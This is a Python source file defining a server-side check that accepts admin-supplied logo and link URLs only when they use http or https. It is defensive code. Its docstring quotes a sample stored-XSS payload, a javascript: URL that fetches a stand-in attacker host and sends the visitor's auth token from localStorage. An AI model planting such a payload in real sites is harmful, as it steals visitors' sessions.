"""Server-side guard for admin-pasted URLs (logos, website/info links).

Mirrors Frontend/src/utils/safeUrl.js's safeHref(), but as the authoritative
check rather than a UI nicety: these values are stored as plain text and
later rendered as <a href> / <img src> to every visitor, including people
who didn't submit them. Without this, a value like
`javascript:fetch('https://evil.example?c='+localStorage.getItem('authToken'))`
saved into a logo/link field would execute in any visitor's browser the
moment they clicked the rendered element — a stored-XSS path that doesn't
need a script tag at all. Restricting to http(s) closes that off regardless
of whether every current and future render site remembers to sanitise too.
"""
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'http', 'https'}


def safe_url_or_none(value):
    """
    Returns the trimmed URL if its scheme is http(s), else None.

    A scheme-relative or bare value (e.g. "example.com/x") is rejected
    rather than guessed at — callers that need "no value provided" and
    "value provided but unsafe" to be distinguishable should check the
    original value's truthiness separately.
    """
    if not isinstance(value, str):
        return None
    trimmed = value.strip()
    if not trimmed:
        return None
    try:
        parsed = urlparse(trimmed)
    except ValueError:
        return None
    if parsed.scheme.lower() in ALLOWED_SCHEMES and parsed.netloc:
        return trimmed
    return None
